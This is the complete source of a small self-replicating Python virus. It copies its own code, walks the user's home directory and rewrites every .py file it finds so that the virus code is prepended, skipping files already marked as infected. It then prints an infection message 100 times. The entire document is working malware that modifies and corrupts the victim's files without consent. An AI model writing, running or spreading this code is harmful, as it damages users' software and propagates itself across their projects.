#Starting Infection
import os,time
virusCode = []
with open(__file__, 'r') as virusFile:
    virusCode = virusFile.readlines()
replecated = False
for line in virusCode:
    if line == "#Starting Infection\n":
        replecated = True
    if not replecated:
        virusCode.append(line)
    if line == "#Ending Infection\n":
        break
infectableFiles = [os.path.join(root, file) for root, _, files in os.walk(os.path.expanduser('~')) 
                            for file in files if os.path.splitext(file)[1].lower() == ".py"]
print(infectableFiles)
for file in infectableFiles:
    codeWithVirus = []
    with open(file, 'r') as infectFile:
        codeBefore = infectFile.readlines()
    infected = False
    for line in codeBefore:
        if line == "#Starting Infection\n":
            infected = True
            break
    if not infected:
        codeWithVirus.extend(virusCode)
        codeWithVirus.append('\n')
        codeWithVirus.extend(codeBefore)
        with open(file, 'w') as fileWithVirus:
            fileWithVirus.writelines(codeWithVirus)
    print(codeWithVirus)
    print(virusCode)
def virusFunc():
    for i in range(100):
        print("Your whole Python files in device is infected!!!")
        time.sleep(2)
virusFunc()
#Ending Infection